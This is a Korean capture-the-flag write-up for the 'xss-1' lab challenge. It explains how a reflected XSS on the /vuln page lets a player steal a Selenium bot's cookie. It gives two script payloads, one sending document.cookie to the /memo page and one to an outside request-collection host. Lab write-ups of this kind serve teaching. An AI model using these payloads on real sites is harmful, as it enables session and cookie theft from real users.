## π“xss-1

```
μ—¬λ¬ κΈ°λ¥κ³Ό μ…λ ¥λ°›μ€ URLμ„ ν™•μΈν•λ” λ΄‡μ΄ κµ¬ν„λ μ„λΉ„μ¤μ…λ‹λ‹¤.  
XSS μ·¨μ•½μ μ„ μ΄μ©ν•΄ ν”λκ·Έλ¥Ό νλ“ν•μ„Έμ”. ν”λκ·Έλ” flag.txt, FLAG λ³€μμ— μμµλ‹λ‹¤.
```

λ“¤μ–΄κ°€λ³΄λ©΄ /, /vuln, /memo, /flag 4κ°μ νμ΄μ§€λ¥Ό μ κ³µν•λ‹¤.


#### μ†μ¤μ½”λ“

vuln νμ΄μ§€λ” μ΄μ©μκ°€ μ „λ‹¬ν• `param` νλΌλ―Έν„°μ κ°’μ„ μ¶λ ¥ν•λ‹¤.
![](../../Attachments/BC90F34F-D2E9-4BB2-94C8-98712D5652CB.png)

memo νμ΄μ§€λ” μ΄μ©μκ°€ μ „λ‹¬ν• `memo` νλΌλ―Έν„° κ°’μ„ `memo_text`μ— μ¶”κ°€ν•κ³ , `render_template` ν•¨μλ¥Ό ν†µν•΄ μ¶λ ¥ν•λ‹¤.
![](../../Attachments/D5DB0D21-75EE-49F1-A59B-A3AB76EB8F65.png)

flag νμ΄μ§€λ” GET μ”μ²­μ κ²½μ° μ΄μ©μμ—κ² URLμ„ μ…λ ¥λ°›λ” νμ΄μ§€λ¥Ό μ κ³µν•λ‹¤.
POST μ”μ²­μ κ²½μ°, μ΄μ©μκ°€ μ „λ‹¬ν• `param` νλΌλ―Έν„°μ— κ°’κ³Ό μΏ ν‚¤μ— FLAGλ¥Ό ν¬ν•¨ν•΄ `check_xss` ν•¨μλ¥Ό νΈμ¶ν•λ‹¤.
![](../../Attachments/3FB2C24F-6461-443E-8E00-112267906E2B.png)

`check_xss` ν•¨μλ” `read_url` ν•¨μλ¥Ό νΈμ¶ν•΄μ„ vuln μ—”λ“ν¬μΈνΈμ— μ ‘μ†ν•λ‹¤.
![](../../Attachments/2351CE11-953A-42F5-99FD-E1B6368DE7FC.png)


`read_url` ν•¨μλ” Selenium μ›Ήλ“λΌμ΄λ²„λ¥Ό μ‚¬μ©ν•΄ μΏ ν‚¤λ¥Ό μ¶”κ°€ν•κ³  μ£Όμ–΄μ§„ urlμ— μ ‘μ†ν•λ” ν•¨μμ€λ‹¤.
λ”°λΌμ„ FLAGλ” Selenium λ΄‡μ μΏ ν‚¤μ— λ“¤μ–΄κ°€ μμΌλ―€λ΅ μΏ ν‚¤λ¥Ό νƒμ·¨ν•΄μ•Ό ν•λ‹¤.


#### μ·¨μ•½μ 

vulnκ³Ό memoλ” λ‘ λ‹¤ μ΄μ©μμ μ…λ ¥κ°’μ„ νμ΄μ§€μ— μ¶λ ¥ν•μ§€λ§, memoλ” `render_translate` ν•¨μλ¥Ό μ‚¬μ©ν•΄μ„ μ¶λ ¥ν•λ‹¤. `render_template` ν•¨μλ” μ „λ‹¬λ ν…ν”λ¦Ώ λ³€μλ¥Ό κΈ°λ΅ν•  λ• HTML μ—”ν‹°ν‹°μ½”λ“λ΅ λ³€ν™ν•΄ μ €μ¥ν•κΈ° λ•λ¬Έμ— XSSκ°€ λ°μƒν•μ§€ μ•λ”λ‹¤.
vulnμ€ μ΄μ©μμ μ…λ ¥κ°’μ„ νμ΄μ§€μ— κ·Έλ€λ΅ μ¶λ ¥ν•κΈ° λ•λ¬Έμ— XSSκ°€ λ°μƒν•λ‹¤.


#### ν•΄κ²°

vuln μ—”λ“ν¬μΈνΈμ—μ„ λ°μƒν•λ” XSS μ·¨μ•½μ μ„ ν†µν•΄ Selenium λ΄‡μ μΏ ν‚¤λ¥Ό νƒμ·¨ν•λ‹¤.
(document.cookie)

memo νμ΄μ§€λ” μ΄μ©μκ°€ μ¶”κ°€ν• κ°’μ„ μ¶λ ¥ν•λ―€λ΅, flag κ°’μ„ ν™•μΈν•λ ¤λ©΄ flag μ—”λ“ν¬μΈνΈμ—μ„ μ΄λ° μ½”λ“λ¥Ό μ…λ ¥ν•λ‹¤.
```javascript
<script>location.href = "/memo?memo=" + document.cookie;</script>
```

![](../../Attachments/C17C5A5F-96CF-4200-B806-B48F0973DC6E.png)

memo νμ΄μ§€μ— flag κ°’μ΄ μ¶λ ¥λμ–΄ μλ‹¤.
![](../../Attachments/9FB04350-D727-4022-9DFA-D48C63DAEF63.png)



νΉμ€ μ™Έλ¶€μ—μ„ μ ‘κ·Ό κ°€λ¥ν• μ›Ή μ„λ²„ μ£Όμ†λ¥Ό λ„£μ–΄μ„ νƒμ·¨ν• μΏ ν‚¤λ¥Ό ν™•μΈν•  μλ„ μλ‹¤.
https://tools.dreamhack.games/main
```javascript
<script>
	location.href = "EXAMPLEHOST.request.dreamhack.games/?memo=" + document.cookie;
</script>
```
![](../../Attachments/A6D2590A-D1D7-416C-BAF0-46C62414563F.png)

